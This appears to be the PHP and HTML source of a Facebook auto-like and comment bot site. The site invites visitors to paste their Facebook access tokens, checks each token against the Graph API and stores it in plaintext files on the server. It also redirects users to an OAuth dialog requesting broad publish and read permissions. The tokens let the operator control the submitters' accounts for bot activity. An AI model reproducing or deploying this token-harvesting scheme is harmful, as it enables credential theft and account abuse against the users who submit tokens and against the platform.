<html>

<html>

	<head>
		<meta charset="utf-8"/>
		<title>CRACKERX BOTTERX</title>







<style>



html {
    text-align:center;
    background: url(fe3l.jpg) no-repeat center center fixed; 
    -webkit-background-size: cover;
    -moz-background-size: cover;
    -o-background-size: cover;
    background-size: cover;
 
}
#header{
    font-family:AwiFont;
}
  
@font-face {

    font-family: AwiFont;

    src: url(awi.ttf);

}
#footer{
    font-family:AwiFont;
}
#header{
    font-family:AwiFont;
}



#footer {
   
    margin:0;
    padding:5px;
    text-align:center;
    font-family: '', cursive;
    font-size: 25px;
    text-shadow: 0 0 11px #ff0000, 0 0 11px #ff0000, 0 0 11px #ff0000;
    color: white;
    }





#center {
    text-align:center;
    margin:0;
    padding:6px 0;
    border-width:1px 0
    }

#user {
    text-align:center;
    margin:0;
    padding:6px 0;
    border-width:1px 0;
    font-family: '', ;
    font-size: 25px;
    text-shadow: 0 0 11px #ff0000, 0 0 11px #ff0000, 0 0 11px #ff0000;
    color: white;
    }
    
    
    .search {
 font-family: 'Cookie', cursive;
    font-size: 25px;
    background:none;
    height:35px;
    line-height:36px;
    margin:5px 0 5px 10px;
    padding:0 10px;
    width:60%;
    color:none;
    border-radius:15px;
    border: 1px solid white;
    text-align:center;
}

.search:focus {
   background:blue;
    cursor:pointer;
    cursor: url(http://ani.cursors-4u.net/cursors/cur-11/cur1089.cur),progress !important;
}

.button {
    font-family: 'Rancho', cursive;
    font-size: 20px;
    background:none;
    color:none;
    height:36px;
    line-height:36px
    margin:5px 10px 5px 0;
    padding:0 12px;
    border-radius:15px;
    border: 1px solid white;
    outline:none;
    transition:all 0.25s;
    -moz-transition:all 0.25s;
    -webkit-transition:all 0.25s;
}

.button:hover{
    background:blue;
    cursor:pointer;
    cursor: url(http://ani.cursors-4u.net/cursors/cur-11/cur1089.cur),progress !important;
}



</style>















<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>
❤AYESH REACTION + COMMENTS BOT❤
</title>
<link rel="stylesheet" type="text/css" href="AYESH.css" media="all,handheld"/>




 
</style>

<?php session_start();

	error_reporting(0);

	$bot=new bot();

	class bot{

public function getGr($as,$bs){

	$ar=array(

	'graph',

	'fb',

	'me'
);

$im='https://'.implode('.',$ar);

	return $im.$as.$bs;
}

public function getUrl($mb,$tk,$uh=null){
	$ar=array(
	
	'access_token' => $tk,
);
	
	if($uh){

	$else=array_merge($ar,$uh);

	}else{

	$else=$ar;
}
	foreach($else as $b => $c){
	
	$CHUMI[]=$b.'='.$c;
}
	$true='?'.implode('&',$CHUMI);
	
	$true=$this->getGr($mb,$true);

	$true=json_decode($this->

	one($true),true);

	if($true[data]){

	return $true[data];

	}else{

	return $true;}
}

private function one($url){

	$cx=curl_init();

	curl_setopt_array($cx,array(

	CURLOPT_URL => $url,

	CURLOPT_CONNECTTIMEOUT => 5,

	CURLOPT_RETURNTRANSFER => 1,

	CURLOPT_USERAGENT => 'SCRIPT CREATED BY Ayesh user',
));

	$ch=curl_exec($cx);

	curl_close($cx);

	return ($ch);
}

public function savEd($tk,$id,$z=null,$bb=null){

	if(!is_dir('CHUMI')){

        mkdir('CHUMI');
}

if($bb){

	$blue=fopen('CHUMI/'.$id,'w');

	fwrite($blue,$tk.'*on*on*on*on*'.$bb);

        fclose($blue);

echo '
	<script type="text/javascript">

	document.getElementById("resp").style="font-color:green;font-family:miaanFont;";

	document.getElementById("resp").innerHTML="Comment Text Saved.";

	</script>';

}else{

        if($z){

	if(file_exists('CHUMI/'.$id)){

	$file=file_get_contents('CHUMI/'.$id);

	$ex=explode('*',$file);

	$str=str_replace($ex[0],$tk,$file);

	$xs=fopen('CHUMI/'.$id,'w');

        fwrite($xs,$str);

        fclose($xs);

}else{
	$str=$tk.'*on*on*on*on*'.$c;

	$xs=fopen('CHUMI/'.$id,'w');

        fwrite($xs,$str);

        fclose($xs);
}

	$_SESSION[key]=$tk.'_'.$id;

	}else{

	$file=file_get_contents('CHUMI/'.$id);

	$file=explode('*',$file);

        if($file[5]){

	$up=fopen('CHUMI/'.$id,'w');

	fwrite($up,$tk.'*on*on*on*on*'.$file[5]);

        fclose($up);

        }else{

	$up=fopen('CHUMI/'.$id,'w');

	fwrite($up,$tk.'*on*on*on*on*');

        fclose($up);
}

echo '

	<script type="text/javascript">

	document.getElementById("resp").style="font-color:green;font-family:miaanFont;";

	document.getElementById("resp").innerHTML="Bot Settings Has Been Updated";

	</script>';}}
}

public function lOgbot($d){

	unlink('CHUMI/'.$d);

	unset($_SESSION[key]);

echo '
	<script type="text/javascript">

	document.getElementById("resp").style="font-color:green;font-family:miaanFont;";

	document.getElementById("resp").innerHTML="Logout Successful";

	</script>';

$this->atas();

$this->home();

$this->bwh();

}

public function cek($tok,$id,$nm){

echo '
<div id="container">
<a href="http://facebook.com/' . $id . '"><img src="https://graph.facebook.com/' . $id . '/picture?width=800" style="-moz-box-shadow:0px 0px 20px 0px red;-webkit-box-shadow:0px 0px 20px 0px red;-o-box-shadow:0px 0px 20px 0px red;box-shadow:0px 0px 20px 0px red;width:150px; height:150px;border-radius:500px;" alt="' . $nm . '"/></a>
<br><font color="white"> Welcome TO AYESH BOT TEAM (JUST LOVE REACT ) Site :</font><font color="BLUE"> '.$nm.' </font></br>
<font color="white"> Activate Your Bot My Dear Friend </font></br>
<form action="index.php" method="post">
<div id="top-content">
<div id="search-form">
<input class="button button1" type="submit" style="height:45px;width:200px;" value="Activate Bot">
</form>
</div>
</div></div>
</div>
</div>';

$this->membEr();
}

public function atas(){
echo'

</center></span>
';
}

public function home(){
echo'
<div id="header">
<div class="foo">
<center>
<b><font style="background: url(&quot;http://img1.liveinternet.ru/images/attach/c/3/77/307/77307665_MontiBlingStar77.gif&quot;) repeat scroll 0% 0% transparent;color:#fff; text-shadow: 0pt 0pt 0.9em white, 0pt 2pt 0.9em white;color: yellow ;font-size:80px;">LONG LIKE+COMMENT SIT3 </font></b>
</div>
<br>
</a></div>
</font>
</div></div>
<a href="https://www.facebook.com/OLdISDISABLE" alt="Owner" target="_blank"> <img src="https://graph.facebook.com/100013201441761/picture?type=large" alt="Profile" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 9px 7px rgb(65, 227, 181); padding: 8px;" width="250" height="250"></a></div>
<br>
</div>

<span>
</div>

<br><center>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<iframe src="//www.facebook.com/plugins/follow?href=https%3A%2F%2Fwww.facebook.com%2Fold.is.disable&amp&amp;layout=standard&amp;show_faces=true&amp;colorscheme=dark&amp;width=450&amp;height=80" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:450px; height:80px;" allowTransparency="true"></iframe>

';
}

public function bwh(){
echo'

<center>
<b><font style="background: url() repeat scroll 0% 0% transparent;color:#fff; text-shadow: 0pt 0pt 0.10em red, 0pt 2pt 0.9em white;color: white ;font-size:30px;">! SUBMIT YOUR TOKEN HERE</font></b>

<center>
<center><form action="index.php" method="post">
<input class="search" type="text" name="token" placeholder="Paste Your Access Token Here" required> <br>

<input class="button" type="submit" value="Submit"></form></center> 
';







$this->membEr();
}

public function membEr(){

	if(!is_dir('CHUMI')){

	mkdir('CHUMI');
}

$up=opendir('CHUMI');

	while($use=readdir($up)){

	if($use != '.' && $use != '..'){

	$user[]=$use;}
}

echo'

<div id="footer">
Active User: <font color="yellow">'.count($user).'
</font>

</div>
<center>
</font>
<b><font style="background: url() repeat scroll 0% 0% transparent;color:#fff; text-shadow: 0pt 0pt 0.10em red, 0pt 2pt 0.9em white;color: white ;font-size:20px;">Modified By : MRDJ AYESH</font></b>
<center>
</font>
<b><font style="background: url() repeat scroll 0% 0% transparent;color:#fff; text-shadow: 0pt 0pt 0.10em red, 0pt 2pt 0.9em white;color: white ;font-size:20;">Edit By : AYAN ALI</font></b>





';

}

public function toXen($h){
header('Location: https://m.facebook.com/dialog/oauth?client_id='.$h.'&redirect_uri=https://www.facebook.com/connect/login_success.html&display=wap&scope=publish_actions%2Cuser_photos%2Cuser_friends%2Cfriends_photos%2Cuser_activities%2Cuser_likes%2Cuser_status%2Cuser_groups%2Cfriends_status%2Cpublish_stream%2Cread_stream%2Cread_requests%2Cstatus_update&response_type=token&fbconnect=1&from_login=1&refid=9');
}


}
if(isset($_SESSION[key])){
        $a=$_SESSION[key];
        $ai=explode('_',$a);
        $a=$ai[0];
if($_POST[logout]){
        $ax=$_POST[logout];
        $bot->lOgbot($ax);
}else{
$b=$bot->getUrl('/me',$a,array(
'fields' => 'id,name',
));
if($b[id]){
if($_POST[likes]){
        $as=$_POST[likes];
        $bs=$_POST[emot];
        $bx=$_POST[target];
        $cs=$_POST[opsi];
        $tx=$_POST[text];
if($cs=='text'){
        unlink('CHUMI/'.$b[id]);
$bot->savEd($a,$b[id],$as,$bs,$bx,'off');
        }else{
        if($tx){
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs,'x',$tx);
        }else{
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs);}}
}
        $bot->atas();
        $bot->home();
$bot->cek($a,$b[id],$b[name]);
}else{
echo '
			<script type="text/javascript">
				document.getElementById("resp").style="color:red;font-family:miaanFont;";
				document.getElementById("resp").innerHTML="<h2>Token Expired</h2>";
			</script>';
        unset($_SESSION[key]);
        unlink('CHUMI/'.$ai[1]);
$bot->atas();
$bot->home();
        $bot->bwh();}}
        }else{
if($_POST[token]){
        $a=$_POST[token];
if(preg_match('/token/',$a)){
$tok=substr($a,strpos($a,'token=')+6,(strpos($a,'&')-(strpos($a,'token=')+6)));
        }else{
        $cut=explode('&',$a);
$tok=$cut[0];
}
$b=$bot->getUrl('/me',$tok,array(
        'fields' => 'id,name',
));
if($b[id]){
$bot->savEd($tok,$b[id],'on','on','on','on','null');
        $bot->atas();
        $bot->home();
$bot->cek($tok,$b[id],$b[name]);
}else{
echo '
			<script type="text/javascript">
				document.getElementById("resp").style="color:red;font-family:miaanFont;";
				document.getElementById("resp").innerHTML="<h2>Invalid Token Or Expired Token</h2>";
			</script>';
        $bot->atas();
        $bot->home();
        $bot->bwh();}
}else{
if($_GET[token]){
        $a=$_GET[token];
        $bot->toXen($a);
}else{
        $bot->atas();
        $bot->home();
        $bot->bwh();}}
}
?>